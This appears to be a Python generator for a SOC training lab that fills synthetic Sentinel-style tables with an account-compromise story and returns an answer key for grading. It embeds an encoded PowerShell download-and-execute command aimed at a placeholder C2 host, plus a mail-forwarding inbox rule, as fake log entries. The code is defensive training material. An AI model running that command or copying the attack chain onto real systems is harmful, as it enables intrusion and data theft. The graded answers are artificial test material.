"""Scenario `identity-compromise`: password spray -> MFA fatigue -> privilege escalation ->
persistence -> mailbox and file theft, plus an implant beaconing from the victim's laptop
and a brute-forced file server. Every detection the SOC labs teach has one true positive
here, hidden in the baseline noise (which has its own false positives).

Story (times relative to the dataset end, all randomised from the seed):
 1. spray      ~D-3: a VPS address sprays 1-2 passwords against most accounts (50126,
               a few 50053 lockouts) over about two hours.
 2. fatigue    the victim's password works: 50074, then a burst of MFA push denials
               (500121), then an approval at night (ResultType 0) from the VPS city:
               impossible travel against the victim's office sign-in a few hours before.
 3. escalate   AuditLogs: the victim registers a new MFA method, creates a backdoor
               account and adds it to Global Administrator.
 4. persist    AzureActivity: the backdoor account grants itself Owner on the
               subscription and creates a VM in a new resource group.
 5. collect    OfficeActivity: an inbox rule forwarding to an outside address, then a
               burst of SharePoint downloads from the VPS address.
 6. implant    the victim's laptop: outlook.exe -> powershell -enc -> a dropped binary
               (rare: one device, one hash) that beacons to a C2 host every N seconds
               with jitter (DeviceNetworkEvents + firewall CommonSecurityLog).
 7. lateral    SecurityEvent: brute force (4625) from the laptop against the file
               server, then a successful network logon (4624) and a new local admin.
The answers (what a learner should find) are returned for the grader.
"""
from __future__ import annotations

import base64
import datetime as dt
import json
import random

from ..baseline import APPS, audit, azure, signin, target_user, winevent
from ..tables import Dataset, iso
from ..world import World, stable_hex, stable_uuid

NAME = "identity-compromise"
DESCRIPTION = "Password spray, MFA fatigue, new Global Administrator, inbox forwarding, file theft, beaconing implant, server brute force"


def generate(ds: Dataset, w: World, start: dt.datetime, end: dt.datetime) -> dict:
    rng = random.Random(f"{w.seed}:{NAME}")
    it_admins = [u for u in w.users if "Privileged Role Administrator" in u.roles]
    victim = it_admins[0]
    vps = w.hosting
    spray_ip = f"198.51.100.{rng.randint(20, 120)}"
    login_ip = spray_ip if rng.random() < 0.5 else f"198.51.100.{rng.randint(121, 240)}"
    # the spray starts between midnight and 03:00 in the victim's time zone, three days before the end
    night = (end - dt.timedelta(days=3)).replace(hour=0, minute=0, second=0, microsecond=0)
    t0 = night + dt.timedelta(hours=rng.randint(0, 2) - victim.city.utc, minutes=rng.randint(0, 59))

    # 1. spray -------------------------------------------------------------------
    targets = [u for u in w.users if u is not victim and rng.random() < 0.7] + [victim]
    rng.shuffle(targets)
    spray_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) python-requests/2.32"
    t = t0
    lockouts = 0
    for u in targets:
        for _ in range(rng.choice([1, 1, 2])):
            t += dt.timedelta(seconds=rng.randint(20, 160))
            locked = rng.random() < 0.06
            lockouts += locked
            code, desc = (("50053", "Account is locked because user tried to sign in too many times with an incorrect user ID or password.")
                          if locked else ("50126", "Invalid username or password or Invalid on-premise username or password."))
            if u is victim:
                continue
            signin(ds, w, rng, t, u, spray_ip, vps, APPS[0], code, desc, ua=spray_ua, client="Other clients",
                   device=False, risk="medium")
    spray_end = t
    # 2. victim: success -> MFA fatigue -> approval at night ---------------------
    # the victim's own office sign-in a few hours earlier (the impossible-travel anchor)
    office_t = t0 - dt.timedelta(hours=rng.randint(4, 6), minutes=rng.randint(0, 59))
    signin(ds, w, rng, office_t, victim, w.egress_ip if victim.city is w.office else victim.city.ip(rng), victim.city,
           APPS[0], auth="multiFactorAuthentication",
           mfa={"authMethod": "Mobile app notification", "authDetail": "MFA completed in Azure AD"})
    t = spray_end + dt.timedelta(minutes=rng.randint(5, 25))
    signin(ds, w, rng, t, victim, login_ip, vps, APPS[4], "50074", "Strong Authentication is required.",
           ua=spray_ua, client="Browser", device=False, risk="high", auth="multiFactorAuthentication")
    denials = rng.randint(9, 24)
    for _ in range(denials):
        t += dt.timedelta(seconds=rng.randint(25, 140))
        signin(ds, w, rng, t, victim, login_ip, vps, APPS[4], "500121",
               "Authentication failed during strong authentication request.", ua=spray_ua, device=False, risk="high",
               auth="multiFactorAuthentication",
               mfa={"authMethod": "Mobile app notification", "authDetail": "MFA denied; user declined the authentication"})
    t += dt.timedelta(seconds=rng.randint(30, 200))
    compromise_t = t
    signin(ds, w, rng, t, victim, login_ip, vps, APPS[4], ua=spray_ua, device=False, risk="high",
           auth="multiFactorAuthentication",
           mfa={"authMethod": "Mobile app notification", "authDetail": "MFA completed in Azure AD"})
    # 3. escalate ----------------------------------------------------------------
    t += dt.timedelta(minutes=rng.randint(3, 12))
    audit(ds, w, rng, t, "User registered security info", victim, [target_user(victim)], category="UserManagement",
          service="Authentication Methods", actor_ip=login_ip,
          details=[{"key": "Method", "value": "Authenticator app"}])
    backdoor_sam = rng.choice(["svc-sync", "svc-backup", "adm-helpdesk", "svc-reporting", "ext-audit"]) + f"{rng.randint(1, 99):02d}"
    backdoor_upn = f"{backdoor_sam}@{w.domain}"
    backdoor = type(victim)(upn=backdoor_upn, display=backdoor_sam, first=backdoor_sam, sam=backdoor_sam,
                            user_id=stable_uuid(rng), department="IT", title="", city=vps, device="", device_id="",
                            device_ip="", os="", browser="")
    t += dt.timedelta(minutes=rng.randint(2, 9))
    audit(ds, w, rng, t, "Add user", victim, [target_user(backdoor, [
        {"displayName": "AccountEnabled", "oldValue": "[]", "newValue": "[true]"},
        {"displayName": "UserPrincipalName", "oldValue": "[]", "newValue": f'["{backdoor_upn}"]'}])], actor_ip=login_ip)
    role = "Global Administrator"
    t += dt.timedelta(minutes=rng.randint(1, 6))
    role_t = t
    audit(ds, w, rng, t, "Add member to role", victim, [target_user(backdoor, [
        {"displayName": "Role.DisplayName", "oldValue": None, "newValue": f'"{role}"'},
        {"displayName": "Role.TemplateId", "oldValue": None, "newValue": '"62e90394-69f5-4237-9190-012177145e10"'}])],
        category="RoleManagement", actor_ip=login_ip)
    # 4. persist (Azure) ----------------------------------------------------------
    t += dt.timedelta(minutes=rng.randint(10, 40))
    new_rg = f"rg-{rng.choice(['tmp', 'test', 'dev'])}-{stable_hex(w.seed, 'rg', n=5)}"
    azure(ds, w, rng, t, "Microsoft.Authorization/roleAssignments/write", "Microsoft.Authorization", backdoor_upn,
          login_ip, "rg-shared-net", "owner-assignment",
          props={"eventCategory": "Administrative", "requestbody": '{"Properties":{"RoleDefinitionId":"/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635","PrincipalType":"User"}}'})
    t += dt.timedelta(minutes=rng.randint(2, 10))
    azure(ds, w, rng, t, "Microsoft.Resources/subscriptions/resourceGroups/write", "Microsoft.Resources", backdoor_upn,
          login_ip, new_rg, new_rg)
    vm_count = rng.randint(2, 5)
    for i in range(vm_count):
        t += dt.timedelta(minutes=rng.randint(1, 4))
        azure(ds, w, rng, t, "Microsoft.Compute/virtualMachines/write", "Microsoft.Compute", backdoor_upn, login_ip,
              new_rg, f"gpu-node-{i}")
    # 5. collect (mailbox rule + file theft) ---------------------------------------
    t = compromise_t + dt.timedelta(minutes=rng.randint(15, 50))
    rule_name = rng.choice([".", "..", "RSS Feeds sync", "Archive", "Junk cleanup"])
    fwd = f"{victim.first.lower()}.{rng.choice(['backup', 'files', 'mail'])}@{rng.choice(['protonmx', 'freemail', 'quickpost'])}.example.net"
    params = [{"Name": "Name", "Value": rule_name}, {"Name": "ForwardTo", "Value": fwd},
              {"Name": "DeleteMessage", "Value": "True"}, {"Name": "MarkAsRead", "Value": "True"},
              {"Name": "StopProcessingRules", "Value": "True"}]
    ds.add("OfficeActivity", TimeGenerated=t, TenantId=w.tenant_id, RecordType="ExchangeAdmin", Operation="New-InboxRule",
           OfficeWorkload="Exchange", UserId=victim.upn, UserType="Regular", ClientIP=f"{login_ip}:{rng.randint(40000, 60000)}",
           ResultStatus="True", OfficeObjectId=f"{victim.upn}\\{rule_name}", MailboxOwnerUPN=victim.upn,
           Parameters=json.dumps(params, separators=(",", ":")))
    site = f"https://{w.domain.split('.')[0]}.sharepoint.com/sites/finance"
    files = rng.randint(35, 90)
    t += dt.timedelta(minutes=rng.randint(5, 30))
    exfil_start = t
    for i in range(files):
        t += dt.timedelta(seconds=rng.randint(2, 15))
        doc = f"{rng.choice(['Payroll', 'Invoices', 'Contracts', 'Forecast', 'Bank'])}-{2026 - rng.randint(0, 3)}-{i:02d}.{rng.choice(['xlsx', 'pdf', 'docx'])}"
        ds.add("OfficeActivity", TimeGenerated=t, TenantId=w.tenant_id, RecordType="SharePointFileOperation",
               Operation="FileDownloaded", OfficeWorkload="SharePoint", UserId=victim.upn, UserType="Regular",
               ClientIP=login_ip, ResultStatus="Succeeded", OfficeObjectId=f"{site}/Shared Documents/{doc}",
               SourceFileName=doc, SourceRelativeUrl="Shared Documents", Site_Url=site + "/", UserAgent=spray_ua)
    # 6. implant + beaconing ---------------------------------------------------------
    t = compromise_t - dt.timedelta(hours=rng.randint(20, 30))   # phish opened the day before
    implant = rng.choice(["updsvc.exe", "OneDriveUpdate.exe", "msedgeupd.exe", "teams_helper.exe", "winsyncd.exe"])
    implant_dir = fr"C:\Users\{victim.sam}\AppData\Local\Temp"
    implant_sha = stable_hex(w.seed, "implant")
    c2_host = f"cdn-{stable_hex(w.seed, 'c2', n=6)}.{rng.choice(['azureedge-cache', 'static-assets', 'msupdate-cdn'])}.example.org"
    c2_ip = f"198.51.100.{rng.randint(241, 254)}"
    payload = base64.b64encode(f"IEX (New-Object Net.WebClient).DownloadString('https://{c2_host}/s')".encode("utf-16-le")).decode()
    dom = w.domain.split(".")[0]
    common = dict(DeviceId=victim.device_id, DeviceName=victim.device.lower(), ActionType="ProcessCreated",
                  AccountDomain=dom, AccountName=victim.sam, AccountUpn=victim.upn)
    ds.add("DeviceProcessEvents", Timestamp=t, FileName="powershell.exe",
           FolderPath=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", SHA256=stable_hex("bin", "powershell.exe"),
           ProcessId=rng.randint(1000, 30000), ProcessCommandLine=f"powershell.exe -nop -w hidden -enc {payload}",
           InitiatingProcessFileName="outlook.exe", InitiatingProcessFolderPath=r"C:\Program Files\Microsoft Office\root\Office16\outlook.exe",
           InitiatingProcessCommandLine='"OUTLOOK.EXE"', InitiatingProcessId=rng.randint(500, 9000),
           InitiatingProcessAccountName=victim.sam, InitiatingProcessParentFileName="explorer.exe", **common)
    t += dt.timedelta(seconds=rng.randint(10, 50))
    ds.add("DeviceProcessEvents", Timestamp=t, FileName=implant, FolderPath=f"{implant_dir}\\{implant}", SHA256=implant_sha,
           ProcessId=rng.randint(1000, 30000), ProcessCommandLine=f'"{implant_dir}\\{implant}" --silent',
           InitiatingProcessFileName="powershell.exe", InitiatingProcessFolderPath=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
           InitiatingProcessCommandLine="powershell.exe -nop -w hidden -enc …", InitiatingProcessId=rng.randint(500, 9000),
           InitiatingProcessAccountName=victim.sam, InitiatingProcessParentFileName="outlook.exe", **common)
    interval = rng.choice([300, 600, 900, 1200])
    jitter = rng.choice([0.05, 0.1, 0.15])
    beacon_t = t + dt.timedelta(seconds=30)
    beacons = 0
    while beacon_t < end:
        ds.add("DeviceNetworkEvents", Timestamp=beacon_t, DeviceId=victim.device_id, DeviceName=victim.device.lower(),
               ActionType="ConnectionSuccess", RemoteIP=c2_ip, RemotePort=443, RemoteUrl=c2_host, LocalIP=victim.device_ip,
               LocalPort=rng.randint(49152, 65000), Protocol="Tcp", InitiatingProcessFileName=implant,
               InitiatingProcessCommandLine=f'"{implant_dir}\\{implant}" --silent', InitiatingProcessAccountName=victim.sam,
               InitiatingProcessSHA256=implant_sha)
        ds.add("CommonSecurityLog", TimeGenerated=beacon_t + dt.timedelta(milliseconds=rng.randint(5, 400)),
               DeviceVendor="Ridgeline", DeviceProduct="RL Edge Firewall", DeviceVersion="9.2.1", DeviceEventClassID="traffic",
               Activity="TRAFFIC", LogSeverity="1", DeviceAction="allow", ApplicationProtocol="ssl", SourceIP=victim.device_ip,
               SourcePort=rng.randint(49152, 65000), DestinationIP=c2_ip, DestinationPort=443, Protocol="TCP",
               RequestURL=f"https://{c2_host}/api/v2/poll", SentBytes=rng.randint(300, 600), ReceivedBytes=rng.randint(200, 900),
               SourceUserName=victim.upn, DeviceName="fw-edge-01", AdditionalExtensions="rule=web-out;zone=lan;cat=uncategorized",
               Computer="fw-edge-01")
        beacons += 1
        beacon_t += dt.timedelta(seconds=interval * (1 + rng.uniform(-jitter, jitter)))
    # 7. lateral: brute force from the laptop against the file server ------------------
    fs = next(s for s in w.servers if s[0].endswith("FS01"))
    dom_u = dom.upper()
    t = compromise_t + dt.timedelta(hours=rng.randint(2, 8))
    bf_account = f"adm-{victim.sam}"
    bf_failures = rng.randint(25, 60)
    for _ in range(bf_failures):
        t += dt.timedelta(seconds=rng.randint(1, 6))
        winevent(ds, w, t, fs[0], 4625, Account=f"{dom_u}\\{bf_account}", AccountType="User", TargetUserName=bf_account,
                 TargetDomainName=dom_u, LogonType=3, IpAddress=victim.device_ip, IpPort=str(rng.randint(49152, 65000)),
                 WorkstationName=victim.device, Status="0xc000006d", SubStatus="0xc000006a")
    t += dt.timedelta(seconds=rng.randint(5, 30))
    bf_success = t
    winevent(ds, w, t, fs[0], 4624, Account=f"{dom_u}\\{bf_account}", AccountType="User", TargetUserName=bf_account,
             TargetDomainName=dom_u, LogonType=3, IpAddress=victim.device_ip, IpPort=str(rng.randint(49152, 65000)),
             WorkstationName=victim.device, Status="0x0", SubStatus="0x0")
    winevent(ds, w, t + dt.timedelta(seconds=1), fs[0], 4672, Account=f"{dom_u}\\{bf_account}", AccountType="User",
             SubjectUserName=bf_account)
    local_admin = f"{rng.choice(['support', 'helpdesk', 'backup'])}_{rng.randint(10, 99)}"
    winevent(ds, w, t + dt.timedelta(minutes=2), fs[0], 4720, Account=f"{dom_u}\\{bf_account}", AccountType="User",
             SubjectUserName=bf_account, TargetUserName=local_admin, TargetAccount=f"{fs[0]}\\{local_admin}")
    winevent(ds, w, t + dt.timedelta(minutes=3), fs[0], 4732, Account=f"{dom_u}\\{bf_account}", AccountType="User",
             SubjectUserName=bf_account, MemberName=local_admin, TargetUserName="Administrators",
             TargetAccount="BUILTIN\\Administrators")

    return {
        "scenario": NAME,
        "victim_upn": victim.upn,
        "victim_device": victim.device.lower(),
        "spray_ip": spray_ip,
        "attacker_login_ip": login_ip,
        "attacker_city": vps.name,
        "attacker_country": vps.country,
        "spray_start": iso(t0),
        "spray_failed_accounts": len(targets) - 1,   # distinct accounts with a 50126/50053 from spray_ip
        "lockouts": lockouts,
        "mfa_denials": denials,
        "compromise_time": iso(compromise_t),
        "office_signin_time": iso(office_t),
        "victim_home_city": victim.city.name,
        "backdoor_upn": backdoor_upn,
        "role_assigned": role,
        "role_assigned_time": iso(role_t),
        "new_resource_group": new_rg,
        "vms_created": vm_count,
        "inbox_rule_name": rule_name,
        "forward_to": fwd,
        "files_downloaded": files,
        "exfil_start": iso(exfil_start),
        "implant_file": implant,
        "implant_sha256": implant_sha,
        "c2_host": c2_host,
        "c2_ip": c2_ip,
        "beacon_interval_s": interval,
        "beacon_jitter": jitter,
        "beacon_count": beacons,
        "bruteforce_server": f"{fs[0]}.{w.domain}",
        "bruteforce_account": bf_account,
        "bruteforce_failures": bf_failures,
        "bruteforce_success_time": iso(bf_success),
        "local_admin_created": local_admin,
    }
